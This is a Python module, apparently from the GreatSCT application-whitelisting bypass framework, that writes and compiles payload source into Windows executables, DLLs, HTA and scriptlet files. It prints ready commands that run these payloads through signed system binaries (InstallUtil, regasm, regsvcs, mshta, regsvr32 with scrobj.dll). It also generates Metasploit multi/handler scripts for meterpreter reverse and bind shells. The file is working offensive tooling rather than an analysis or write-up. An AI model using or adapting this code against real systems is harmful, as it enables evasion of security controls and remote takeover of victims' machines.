# This file helps "compilation" of source code

import hashlib
import os
import sys
from Tools.Bypass.bypass_common import bypass_helpers # pylint: disable=E0611,E0401
from lib.common import helpers # pylint: disable=E0611,E0401

# try to find and import the settings.py config file
if os.path.exists("/etc/greatsct/settings.py"):
    try:
        sys.path.append("/etc/greatsct/")
        import settings

    except ImportError:
        print("\n [!] ERROR #1: run %s manually\n" % (os.path.abspath("./config/update.py")))
        sys.exit()


def compiler(payload_object, invoked=False, cli_object=None):
    # Check the source code to ensure it is present
    if payload_object.payload_source_code == '':
        print(helpers.color("\n [!] ERROR: No payload source code provided.\n", warning=True))
        return False
    else:
        # print title bar
        bypass_helpers.title_screen()

        if not invoked:
            # Determine the file name to use for output
            file_name = input('Please enter the base name for output files (default is payload): ').strip()
        else:
            file_name = cli_object.o

        # Basic checks on input
        while file_name != '' and ("\\" in file_name or "/" in file_name):
            print(helpers.color("\nPlease provide a base name, not a path, for the output base\n", warning=True))
            file_name = input('Please enter the base name for output files (default is payload): ').strip()

        # If no base name, set it to be payload
        if file_name == '':
            file_name = 'payload'

        # run check to make sure file doesn't exist, if it does
        # provide a new filename
        file_name = find_file_name(file_name, payload_object)
        source_code_filepath = settings.PAYLOAD_SOURCE_PATH + file_name + "." + payload_object.extension
        # Used when outputting exe files, go figure
        executable_filepath = settings.PAYLOAD_COMPILED_PATH + file_name + ".exe"
        dll_filepath = settings.PAYLOAD_COMPILED_PATH + file_name + ".dll"

        # Always write the source code to disk
        with open(source_code_filepath, 'w') as source_file:
            source_file.write(payload_object.payload_source_code)

        if payload_object.language == 'msbuild':
            bypass_helpers.title_screen()
            print_payload_information(payload_object)
            print(" [*] MSBuild compiles for  us, so you just get xml :)")
            print(" [*] Source code written to: " + helpers.color(source_code_filepath))

        elif payload_object.language == 'installutil':
            if payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y':
                # Compile our CS code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('mcs -platform:x86 -target:winexe -r:System.Configuration.Install,System.Windows.Forms ' + source_code_filepath + ' -out:' + executable_filepath)

                bypass_helpers.title_screen()

                if os.path.isfile(executable_filepath):
                    hash_executable(executable_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] Executable written to: " + helpers.color(executable_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
                print(" [*] Source code written to: " + helpers.color(source_code_filepath))
                print(" [*] Execute with: " + helpers.color("C:\Windows\Microsoft.NET\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false {0}.exe".format(file_name)))

            elif payload_object.required_options['COMPILE_TO_DLL'][0].lower() == 'y':
                # Compile our CS code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('mcs -platform:x86 -target:library -r:System.Configuration.Install,System.Windows.Forms ' + source_code_filepath + ' -out:' + dll_filepath)

                bypass_helpers.title_screen()

                if os.path.isfile(dll_filepath):
                    hash_executable(dll_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] DLL written to: " + helpers.color(dll_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
                print(" [*] Source code written to: " + helpers.color(source_code_filepath))
                print(" [*] Execute with: " + helpers.color("C:\Windows\Microsoft.NET\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false {0}.dll".format(file_name)))

        elif payload_object.language == 'installutil_powershell':
            if payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y':
                # Compile our CS code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('mcs -platform:x86 -target:winexe -r:System.Configuration.Install,System.Windows.Forms,"/usr/share/powershell/System.Management.Automation.dll" ' + source_code_filepath + ' -out:' + executable_filepath)

                bypass_helpers.title_screen()

                if os.path.isfile(executable_filepath):
                    hash_executable(executable_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] Executable written to: " + helpers.color(executable_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
                print(" [*] Source code written to: " + helpers.color(source_code_filepath))
                print(" [*] Execute with: " + helpers.color("C:\Windows\Microsoft.NET\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false {0}.exe".format(file_name)))

            elif payload_object.required_options['COMPILE_TO_DLL'][0].lower() == 'y':
                # Compile our CS code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('mcs -platform:x86 -target:library -r:System.Configuration.Install,System.Windows.Forms,"/usr/share/powershell/System.Management.Automation.dll" ' + source_code_filepath + ' -out:' + dll_filepath)

                bypass_helpers.title_screen()

                if os.path.isfile(dll_filepath):
                    hash_executable(dll_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] DLL written to: " + helpers.color(dll_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
                print(" [*] Source code written to: " + helpers.color(source_code_filepath))
                print(" [*] Execute with: " + helpers.color("C:\Windows\Microsoft.NET\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false {0}.dll".format(file_name)))

        elif payload_object.language == 'regasm':

            if payload_object.required_options['COMPILE_TO_DLL'][0].lower() == 'y':
                # Compile our CS code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('mcs -platform:x86 -target:library -r:System.EnterpriseServices,System.Windows.Forms ' + source_code_filepath + ' -out:' + dll_filepath)

                bypass_helpers.title_screen()

                if os.path.isfile(dll_filepath):
                    hash_executable(dll_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] DLL written to: " + helpers.color(dll_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
                print(" [*] Source code written to: " + helpers.color(source_code_filepath))
                print(" [*] Execute with: " + helpers.color("C:\Windows\Microsoft.NET\Framework\\v4.0.30319\\regasm.exe /U {0}.dll".format(file_name)))

        elif payload_object.language == 'regasm_powershell':

            if payload_object.required_options['COMPILE_TO_DLL'][0].lower() == 'y':
                # Compile our CS code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('mcs -platform:x86 -target:library -r:System.EnterpriseServices,System.Windows.Forms,"/usr/share/powershell/System.Management.Automation.dll" ' + source_code_filepath + ' -out:' + dll_filepath)

                bypass_helpers.title_screen()

                if os.path.isfile(dll_filepath):
                    hash_executable(dll_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] DLL written to: " + helpers.color(dll_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
                print(" [*] Source code written to: " + helpers.color(source_code_filepath))
                print(" [*] Execute with: " + helpers.color("C:\Windows\Microsoft.NET\Framework\\v4.0.30319\\regasm.exe /U {0}.dll".format(file_name)))

        elif payload_object.language == 'regsvcs':

            if payload_object.required_options['COMPILE_TO_DLL'][0].lower() == 'y':
                # generate a strong name signing key
                os.system("sn -k /tmp/key.snk")
                # Compile our CS code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('mcs -platform:x86 -target:library -keyfile:/tmp/key.snk -r:System.EnterpriseServices,System.Windows.Forms ' + source_code_filepath + ' -out:' + dll_filepath)

                bypass_helpers.title_screen()

                if os.path.isfile(dll_filepath):
                    hash_executable(dll_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] DLL written to: " + helpers.color(dll_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
                print(" [*] Source code written to: " + helpers.color(source_code_filepath))
                print(" [*] Execute with: " + helpers.color("C:\Windows\Microsoft.NET\Framework\\v4.0.30319\\regsvcs.exe {0}.dll".format(file_name)))

        elif payload_object.language == 'regsvcs_powershell':

            if payload_object.required_options['COMPILE_TO_DLL'][0].lower() == 'y':
                # Compile our CS code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('mcs -platform:x86 -target:library -r:System.EnterpriseServices,System.Windows.Forms,"/usr/share/powershell/System.Management.Automation.dll" ' + source_code_filepath + ' -out:' + dll_filepath)

                bypass_helpers.title_screen()

                if os.path.isfile(dll_filepath):
                    hash_executable(dll_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] DLL written to: " + helpers.color(dll_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
                print(" [*] Source code written to: " + helpers.color(source_code_filepath))
                print(" [*] Execute with: " + helpers.color("C:\Windows\Microsoft.NET\Framework\\v4.0.30319\\regsvcs.exe {0}.dll".format(file_name)))

        elif payload_object.language == 'c':
            if payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y':
                # Compile our C code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('i686-w64-mingw32-gcc -Wl,-subsystem,windows ' + source_code_filepath + ' -o ' + executable_filepath + " -lwsock32")

                bypass_helpers.title_screen()

                if os.path.isfile(executable_filepath):
                    hash_executable(executable_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] Executable written to: " + helpers.color(executable_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
            print(" [*] Source code written to: " + helpers.color(source_code_filepath))
        
        elif payload_object.language == 'mshta':

            bypass_helpers.title_screen()
            print_payload_information(payload_object)

            if payload_object.required_options['SCRIPT_TYPE'][0].lower() == 'jscript':

                print(" [*] HTA code written to: " +
                    helpers.color(source_code_filepath))
                
                print(" [*] Execute with: " + helpers.color("mshta.exe {0}.hta".format(file_name)))

           
            elif payload_object.required_options['SCRIPT_TYPE'][0].lower() == 'vbscript':
                
                print(" [*] HTA code written to: " +
                      helpers.color(source_code_filepath))

                print(" [*] Execute with: " + helpers.color("mshta.exe {0}.hta".format(file_name)))

            else:
                print(helpers.color("\n[!] Error: Script type not supported!\n", warning=True))
        
        elif payload_object.language == "regsvr32":

            bypass_helpers.title_screen()
            print_payload_information(payload_object)

            if payload_object.required_options['SCRIPT_TYPE'][0].lower() == 'jscript':

                print(" [*] COM Scriptlet code written to: " +
                    helpers.color(source_code_filepath))
                
                print(" [*] Execute with: " + helpers.color("regsvr32.exe /s /u /n /i:{0}.sct scrobj.dll".format(file_name)))
           
            elif payload_object.required_options['SCRIPT_TYPE'][0].lower() == 'vbscript':
                
                print(" [*] COM Scriptlet code written to: " +
                      helpers.color(source_code_filepath))

                print(" [*] Execute with: " + helpers.color("regsvr32.exe /s /u /n /i:{0}.sct scrobj.dll".format(file_name)))

            else:
                print(helpers.color("\n[!] Error: Script type not supported!\n", warning=True))

        else:
            print(helpers.color("\n [!] ERROR: Invalid payload language in payload module.\n", warning=True))
            return False

        if invoked:
            handler_code_generator(payload_object, file_name, invoked=True, cli_obj=cli_object)
        else:
            handler_code_generator(payload_object, file_name)
        if os.path.isfile(settings.HANDLER_PATH + file_name + '.rc'):
            print(" [*] Metasploit RC file written to: " + helpers.color(settings.HANDLER_PATH + file_name + '.rc'))

        if not invoked:
            dummy = input('\nPlease press enter to continue >: ')

    # End of if statement checking to make sure payload_source_code is
    # not empty

    return True


def find_file_name(payload_name, selected_payload_object):
    # Assume file exists until we can verify it doesn't
    filename_exists = True
    counter = 0
    first_time = True
    while filename_exists:
        if first_time:
            if not os.path.isfile(settings.PAYLOAD_SOURCE_PATH + payload_name + "." + selected_payload_object.extension) and not os.path.isfile(settings.PAYLOAD_COMPILED_PATH + payload_name + "." + selected_payload_object.extension):
                filename_exists = False
            else:
                counter += 1
                first_time = False
        else:
            if not os.path.isfile(settings.PAYLOAD_SOURCE_PATH + payload_name + str(counter) + "." + selected_payload_object.extension) and not os.path.isfile(settings.PAYLOAD_COMPILED_PATH + payload_name + str(counter) + "." + selected_payload_object.extension):
                filename_exists = False
            else:
                counter += 1
    if first_time:
        return payload_name
    else:
        return payload_name + str(counter)


def handler_code_generator(selected_payobject, handler_name, invoked=False, cli_obj=None):
    lhost_value = ''
    lport_value = ''
    rhost_value = ''
    payload_used = ''
    skip_handler = False

    if selected_payobject.language != "native" and selected_payobject.extension != "war":
        if 'shellcode_inject' in selected_payobject.path:
            # Parse the object to generate the payload
            if type(selected_payobject.shellcode.shellcode_options) is dict or invoked:
                if selected_payobject.payload_type == 'rev_tcp':
                    payload_used = 'windows/meterpreter/reverse_tcp'
                elif selected_payobject.payload_type == 'rev_http':
                    payload_used = 'windows/meterpreter/reverse_http'
                elif selected_payobject.payload_type == 'rev_https':
                    payload_used = 'windows/meterpreter/reverse_https'
                elif selected_payobject.payload_type == 'rev_tcp_dns':
                    payload_used = 'windows/meterpreter/reverse_tcp_dns'
                elif selected_payobject.payload_type == 'rev_tcp_all_ports':
                    payload_used = 'windows/meterpreter/reverse_tcp_allports'
                elif selected_payobject.payload_type == 'bind_tcp':
                    payload_used = 'windows/meterpreter/bind_tcp'

                if invoked:
                    lhost_value = cli_obj.ip
                    lport_value = str(cli_obj.port)
                else:
                    if 'LHOST' in selected_payobject.shellcode.shellcode_options:
                        lhost_value = selected_payobject.shellcode.shellcode_options['LHOST']
                    if 'LPORT' in selected_payobject.shellcode.shellcode_options:
                        lport_value = selected_payobject.shellcode.shellcode_options['LPORT']
                    if 'RHOST' in selected_payobject.shellcode.shellcode_options:
                        rhost_value = selected_payobject.shellcode.shellcode_options['RHOST']

            else:
                # parse msfvenom command
                payload_used = selected_payobject.payload_type

                split_msf_command = selected_payobject.shellcode.shellcode_options.split()
                for option in split_msf_command:
                    if 'LHOST' in option:
                        lhost_value = option.split('=')[1]
                    elif 'LPORT' in option:
                        lport_value = option.split('=')[1]
                    elif 'RHOST' in option:
                        rhost_value = option.split('=')[1]

        elif 'meterpreter' in selected_payobject.path:
            # Determine payload type
            if 'bind_tcp' in selected_payobject.path:
                payload_used = 'windows/meterpreter/bind_tcp'
            elif 'rev_tcp' in selected_payobject.path:
                payload_used = 'windows/meterpreter/reverse_tcp'
            elif 'rev_https' in selected_payobject.path:
                payload_used = 'windows/meterpreter/reverse_https'
            elif 'rev_http' in selected_payobject.path:
                payload_used = 'windows/meterpreter/reverse_http'

            # Grab LHOST or RHOST and LPORT values
            if 'LHOST' in selected_payobject.required_options:
                lhost_value = selected_payobject.required_options['LHOST'][0]
            if 'RHOST' in selected_payobject.required_options:
                rhost_value = selected_payobject.required_options['RHOST'][0]
            if 'LPORT' in selected_payobject.required_options:
                lport_value = selected_payobject.required_options['LPORT'][0]

        # Generate the handler file
        handler_text = 'use exploit/multi/handler\n'
        handler_text += 'set PAYLOAD ' + payload_used + '\n'
        if lhost_value:
            handler_text += 'set LHOST ' + lhost_value + '\n'
        elif rhost_value:
            handler_text += 'set RHOST ' + rhost_value + '\n'
        else:
            print(helpers.color("\nError generating handler code, giving up on creating the .rc file\n", warning=True))
            skip_handler = True
        handler_text += 'set LPORT ' + str(lport_value) + '\n'
        handler_text += 'set ExitOnSession false\n'
        handler_text += 'exploit -j'

        if not skip_handler:
            with open(settings.HANDLER_PATH + handler_name + '.rc', 'w') as handler_out:
                handler_out.write(handler_text)
    else:
        # we do nothing since no handler file is made for native payloads
        pass
    return


def hash_executable(exe_path, file_name):
    # Read executable, hash it, and store in file
    with open(exe_path, 'rb') as get_hash:
        exe_contents = get_hash.read()

    sha1_hasher = hashlib.sha1()
    sha1_hasher.update(exe_contents)
    sha1_hash = sha1_hasher.hexdigest()

    # Write hashed value to file
    with open(settings.HASH_LIST, 'a') as hash_file:
        hash_file.write(sha1_hash + ":" + file_name + "\n")

    return


def print_payload_information(pay_object):
    print(' [*] Language: ' + helpers.color(pay_object.language))
    print(' [*] Payload Module: ' + helpers.color(pay_object.path))
    return
